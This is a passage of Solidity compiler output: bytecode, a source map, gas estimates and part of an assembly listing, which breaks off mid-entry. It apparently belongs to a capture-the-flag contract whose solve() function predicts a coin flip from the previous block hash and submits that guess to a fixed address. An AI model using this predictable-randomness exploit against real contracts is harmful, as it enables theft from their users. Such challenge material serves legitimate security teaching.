DUP4 ADD DUP6 PUSH2 0x22A JUMP JUMPDEST PUSH2 0x2B2 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x21B JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2CE PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x26A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2F5 DUP3 PUSH2 0x365 JUMP JUMPDEST SWAP2 POP PUSH2 0x300 DUP4 PUSH2 0x365 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x310 JUMPI PUSH2 0x30F PUSH2 0x3D1 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x326 DUP3 PUSH2 0x365 JUMP JUMPDEST SWAP2 POP PUSH2 0x331 DUP4 PUSH2 0x365 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x344 JUMPI PUSH2 0x343 PUSH2 0x3A2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x38D JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x372 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x39C JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0x3BCDD29619CD8C50CA8EB1660D4B82A5C8B69B1E33484F DUP6 ADDMOD INVALID 0xFC 0xAD EXTCODESIZE 0x5C JUMP PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
							"sourceMap": "810:555:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1006:356;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;1039:7;1059:15;1125:1;1116:6;;1110:1;1095:12;:16;;;;:::i;:::-;1085:27;1077:36;;:45;;;;:::i;:::-;:49;1059:67;;1140:10;1137:218;;;1166:12;;;;;;;;;;;:25;;1203:23;1227:4;1192:40;;;;;;;;;:::i;:::-;;;;;;;;;;;;;1166:67;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1137:218;;;1275:12;;;;;;;;;;;:25;;1312:23;1336:5;1301:41;;;;;;;;;:::i;:::-;;;;;;;;;;;;;1275:68;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1137:218;1048:314;1006:356;:::o;7:109:1:-;88:21;103:5;88:21;:::i;:::-;83:3;76:34;7:109;;:::o;122:118::-;209:24;227:5;209:24;:::i;:::-;204:3;197:37;122:118;;:::o;246:373::-;350:3;378:38;410:5;378:38;:::i;:::-;432:88;513:6;508:3;432:88;:::i;:::-;425:95;;529:52;574:6;569:3;562:4;555:5;551:16;529:52;:::i;:::-;606:6;601:3;597:16;590:23;;354:265;246:373;;;;:::o;625:118::-;712:24;730:5;712:24;:::i;:::-;707:3;700:37;625:118;;:::o;749:271::-;879:3;901:93;990:3;981:6;901:93;:::i;:::-;894:100;;1011:3;1004:10;;749:271;;;;:::o;1026:320::-;1141:4;1179:2;1168:9;1164:18;1156:26;;1192:71;1260:1;1249:9;1245:17;1236:6;1192:71;:::i;:::-;1273:66;1335:2;1324:9;1320:18;1311:6;1273:66;:::i;:::-;1026:320;;;;;:::o;1352:222::-;1445:4;1483:2;1472:9;1468:18;1460:26;;1496:71;1564:1;1553:9;1549:17;1540:6;1496:71;:::i;:::-;1352:222;;;;:::o;1580:98::-;1631:6;1665:5;1659:12;1649:22;;1580:98;;;:::o;1684:147::-;1785:11;1822:3;1807:18;;1684:147;;;;:::o;1837:185::-;1877:1;1894:20;1912:1;1894:20;:::i;:::-;1889:25;;1928:20;1946:1;1928:20;:::i;:::-;1923:25;;1967:1;1957:35;;1972:18;;:::i;:::-;1957:35;2014:1;2011;2007:9;2002:14;;1837:185;;;;:::o;2028:191::-;2068:4;2088:20;2106:1;2088:20;:::i;:::-;2083:25;;2122:20;2140:1;2122:20;:::i;:::-;2117:25;;2161:1;2158;2155:8;2152:34;;;2166:18;;:::i;:::-;2152:34;2211:1;2208;2204:9;2196:17;;2028:191;;;;:::o;2225:90::-;2259:7;2302:5;2295:13;2288:21;2277:32;;2225:90;;;:::o;2321:77::-;2358:7;2387:5;2376:16;;2321:77;;;:::o;2404:::-;2441:7;2470:5;2459:16;;2404:77;;;:::o;2487:307::-;2555:1;2565:113;2579:6;2576:1;2573:13;2565:113;;;2664:1;2659:3;2655:11;2649:18;2645:1;2640:3;2636:11;2629:39;2601:2;2598:1;2594:10;2589:15;;2565:113;;;2696:6;2693:1;2690:13;2687:101;;;2776:1;2767:6;2762:3;2758:16;2751:27;2687:101;2536:258;2487:307;;;:::o;2800:180::-;2848:77;2845:1;2838:88;2945:4;2942:1;2935:15;2969:4;2966:1;2959:15;2986:180;3034:77;3031:1;3024:88;3131:4;3128:1;3121:15;3155:4;3152:1;3145:15"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "215600",
								"executionCost": "46630",
								"totalCost": "262230"
							},
							"external": {
								"solve()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 850,
									"end": 927,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 833,
									"end": 927,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 833,
									"end": 927,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 957,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "ECD6671D91E677522F698C59B7B7F69A0682D975"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 810,
									"end": 1365,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220763bcdd29619cd8c50ca8eb1660d4b82a5c8b69b1e33484f8508fefcad3b5c5664736f6c63430008070033",
									".code": [
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "890D6908"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1365,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1039,
											"end": 1046,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1059,
											"end": 1074,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1125,
											"end": 1126,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1116,
											"end": 1122,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1116,
											"end": 1122,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1110,
											"end": 1111,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1095,
											"end": 1107,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1095,
											"end": 1111,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1085,
											"end": 1112,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 1077,
											"end": 1113,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1077,
											"end": 1113,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1077,
											"end": 1122,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1077,
											"end": 1126,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 1059,
											"end": 1126,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1059,
											"end": 1126,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1140,
											"end": 1150,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1166,
											"end": 1178,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1191,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1166,
											"end": 1191,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1203,
											"end": 1226,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D"
										},
										{
											"begin": 1227,
											"end": 1231,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1192,
											"end": 1232,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DELEGATECALL",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1166,
											"end": 1233,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "PUSH",
